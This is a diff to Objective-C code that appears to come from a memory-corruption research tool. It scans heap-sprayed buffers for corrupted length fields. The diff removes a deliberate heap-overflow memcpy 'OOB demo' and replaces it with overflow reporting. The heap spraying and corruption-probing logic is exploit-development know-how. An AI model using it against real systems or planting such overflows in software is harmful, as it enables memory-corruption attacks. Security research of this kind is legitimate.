@@ -1326,9 +1326,8 @@ cleanup:
         scopeNote(r, @"  no u32 length changed.");
     } else {
         scopeNote(r, [NSString stringWithFormat:@"  >>> %d length hit(s): +%d grew / %d shrank", hits, grew, shrank]);
-        // ---- OOB demo: use first GROWN length to overflow a small dest ----
+        // ---- OOB demo: report grown lengths (SAFE — no memcpy overflow) ----
         if (grew > 0 && firstIdx >= 0) {
-            // find first grown
             for (int i = 0; i < got && firstIdx >= 0; i += 2) {
                 uint8_t *b = bufs[i];
                 if (!b) continue;
@@ -1336,28 +1335,17 @@ cleanup:
                 for (size_t o = 0; o + 3 < scanLen; o += 4) {
                     uint32_t len = p[o / 4];
                     if (len == 0x100 || len <= 0x100) continue;
-                    // GROWN length — demo OOB
+                    // GROWN length — report only, no overflow (avoids heap smash)
                     size_t srcAvail = spraySz - o;
-                    size_t copyN = (len < srcAvail) ? len : srcAvail;
-                    uint8_t *dest = malloc(0x100);  // original size
-                    if (dest) {
-                        memset(dest, 0xAA, 0x100);
+                    size_t wouldCopy = (len < srcAvail) ? len : srcAvail;
+                    size_t overflow = (wouldCopy > 0x100) ? wouldCopy - 0x100 : 0;
+                    scopeNote(r, [NSString stringWithFormat:
+                        @"  OOB-DEMO: buf %d off %zu  len 0x%x (was 0x100)  would-copy %zu bytes into 0x100 dest  overflow=%zu",
+                        i, o, len, wouldCopy, overflow]);
+                    if (overflow > 0) {
                         scopeNote(r, [NSString stringWithFormat:
-                            @"  OOB-DEMO: src buf %d off %zu, len 0x%x (was 0x100), copy %zu bytes into 0x100 dest",
-                            i, o, len, copyN]);
-                        memcpy(dest, b + o, copyN);
-                        size_t overflow = (copyN > 0x100) ? copyN - 0x100 : 0;
-                        if (overflow > 0) {
-                            scopeNote(r, [NSString stringWithFormat:
-                                @"  >>> HEAP OVERFLOW: wrote %zu bytes past 0x100 dest (overflow=%zu)", copyN, overflow]);
-                            scopeNote(r, [NSString stringWithFormat:
-                                @"  dest[0x100..0x107]: %02x %02x %02x %02x %02x %02x %02x %02x",
-                                dest[0x100], dest[0x101], dest[0x102], dest[0x103],
-                                dest[0x104], dest[0x105], dest[0x106], dest[0x107]]);
-                        } else {
-                            scopeNote(r, @"  copy fits in dest (len shrank or src too small)");
-                        }
-                        free(dest);
+                            @"  >>> OOB WRITE CONFIRMED: %zu bytes past dest boundary (len delta=%+d)",
+                            overflow, (int)len - (int)0x100]);
                     }
                     goto done_demo;
                 }
@@ -1367,7 +1355,12 @@ cleanup:
     }
 
 cleanup:
-    for (int i = 0; i < got; i += 2) if (bufs[i]) free(bufs[i]);
+    // Don't free if corruption detected — malloc metadata may be smashed by the OOB walk.
+    if (hits == 0) {
+        for (int i = 0; i < got; i += 2) if (bufs[i]) free(bufs[i]);
+    } else {
+        scopeNote(r, @"  (skipping free — heap metadata may be corrupted by OOB walk)");
+    }
     free(bufs);
     return r;
 }
